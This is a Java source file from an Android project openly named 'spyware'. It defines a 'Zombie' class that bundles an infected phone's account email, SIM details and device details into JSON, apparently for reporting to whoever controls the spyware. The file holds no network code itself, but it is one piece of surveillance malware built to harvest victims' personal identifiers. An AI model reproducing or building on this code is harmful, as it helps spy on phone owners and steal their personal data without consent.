package android.spyware;

import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * This class contains a Zombie declaration along with some related helper methods.
 */
public class Zombie {
    private Map<String, String> sim;
    private Map<String, String> device;
    private String email;

    public Zombie(String email, Map<String, String> device, Map<String, String> sim) {
        this.email = email;
        this.sim = sim;
        this.device = device;
    }

    public JSONObject toJSON() {
        JSONObject jZombie = new JSONObject();

        try {
            jZombie.put("email", email);
            jZombie.put("sim", new JSONObject(sim));
            jZombie.put("device", new JSONObject(device));
        } catch (JSONException e) {
            if (DEV_MODE)
                Log.wtf(TAG, "::ERR  " + Log.getStackTraceString(e));
            return null;
        }

        return jZombie;
    }
}
